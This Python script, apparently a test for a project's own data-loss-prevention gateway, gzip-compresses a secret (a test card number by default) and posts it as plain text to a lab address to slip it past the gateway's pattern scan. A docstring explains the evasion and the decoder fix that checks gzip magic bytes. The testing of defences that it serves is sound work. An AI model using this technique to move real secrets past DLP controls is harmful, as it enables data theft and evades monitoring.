import argparse
import gzip
import requests

DEFAULT_URL = "http://172.21.0.10/"
CARD = "4111111111111111"

'''
Explanation:
  Gzip is a compression algorithm (readable text -> compact bytes)
  Example: "4111111111111111" -> \x1f\x8b\x08\x00\x00\x00\x00\x00\x02\xff31D\x05\x00\x90\xd5Bf\x10\x00\x00\x00

  DLP gateway inpects requests looking for secret patterns.
  It handles application/x-www-form-urlencoded and application/json bodies meaning this fields
  would be decoded and analysed. Any other fields are considered to be text and analysed.

  But now we are sending a the secret compressed in a field that will be considered as text.
  It will not be modified by the decoding process of the DLP gateway and it will be analysed
  as plain text. Since the text are compressed bytes, no patter will be recognized.

  How to prevent this type of attacks?
  The l7 decoder (in detection/l7_web/decoder.py) is the section of our code that reads the
  request body and converts it into text before scanning, as mentioned before.
  If we uncomment the fix lines in the decoder we fix the problem by checking gxip magic bytes,
  this is, a signature that identifies any gzip file.
'''
def send_gzip_payload(url: str, secret: str) -> None:

    compressed = gzip.compress(secret.encode())

    print(f"[*] Original secret {secret}.")
    print(f"[*] Compressed secret: {compressed}.")
    print(f"[*] Sending gzip payload to {url}...")

    try:
        resp = requests.post(url, data={"data": compressed}, headers={"Content-Type": "text/plain"}, timeout=5)
        if resp.status_code == 403:
            print("[!] Blocked by DLP Gateway (403 Forbidden).")
        elif resp.status_code == 200:
            print("[+] Success: Exfiltrated to external server (200 OK).")
        else:
            print(f"[?] Server returned HTTP {resp.status_code}")
    except Exception as err:
        print(f"[-] Request failed: {err}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default=DEFAULT_URL, help="Target URL")
    parser.add_argument(
        "--secret", default=CARD, help="Payload"
    )
    args = parser.parse_args()

    send_gzip_payload(args.url, args.secret)
